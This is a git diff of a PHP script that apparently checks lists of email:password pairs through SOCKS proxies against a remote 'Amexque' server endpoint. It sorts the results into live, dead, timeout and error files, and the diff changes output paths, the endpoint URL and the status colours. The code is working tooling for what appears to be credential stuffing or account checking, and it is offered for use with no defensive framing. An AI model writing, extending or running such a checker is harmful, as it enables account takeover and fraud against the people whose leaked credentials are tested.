@@ -1,26 +1,29 @@
 <?php
 ini_set("memory_limit", "-1");
 set_time_limit(0);
-error_reporting(0);
+// error_reporting(0);
 
 require_once(__DIR__ . '/vendor/autoload.php');
 
 function save($type, $empas) {
   switch ($type) {
     case 'DIE':
-      $file   = fopen('die.txt', 'a');
+      $file   = fopen('result/die.txt', 'a');
     break;
     case 'LIVE':
-      $file   = fopen('live.txt', 'a');
+      $file   = fopen('result/live.txt', 'a');
     break;
     case 'TIMEOUT':
-      $file   = fopen('timeout.txt', 'a');
+      $file   = fopen('result/timeout.txt', 'a');
     break;
     case 'BAD':
       $file   = fopen('result/400.txt', 'a');
     break;
+    case '400':
+      $file   = fopen('result/400.txt', 'a');
+    break;
     default:
-      $file   = fopen('unknown.txt', 'a');
+      $file   = fopen('result/unknown.txt', 'a');
     break;
   }
 
@@ -59,7 +62,8 @@ foreach ($chunk as $key => $cot) {
   if (empty($cot)) { continue; }
   foreach ($cot as $asu => $mp) {
     if (empty($mp) || empty($sock[$asu])) { continue; }
-    $rollingCurl->get('http://localhost/Amexque/a.php?empas=' . $mp . '&sock=' . $sock[$asu]);
+    // $rollingCurl->get('https://memexque.herokuapp.com/server.php?empas=' . $mp . '&sock=' . $sock[$asu]);
+    $rollingCurl->get('http://localhost/Amexque/server.php?empas=' . $mp . '&sock=' . $sock[$asu]);
   }
 }
 
@@ -83,7 +87,7 @@ $rollingCurl
 
         switch ($json->status) {
           case 'TIMEOUT':
-            $status   = $colors->getColoredString("TIMEOUT ", "purple", null);
+            $status   = $colors->getColoredString("TIMEOUT ", "yellow", null);
           break;
 
           case 'DIE':
@@ -97,8 +101,13 @@ $rollingCurl
           case '403':
             $status   = $colors->getColoredString("FORBIDEN", "cyan", null);
           break;
+
+          case '400':
+            $status   = $colors->getColoredString("400        ", "cyan", null);
+          break;
+
           default:
-            $status   = $colors->getColoredString("UNKNOWN ", "cyan", null);
+            $status   = $colors->getColoredString("UNKNOWN ", "light_gray", null);
           break;
         }
 
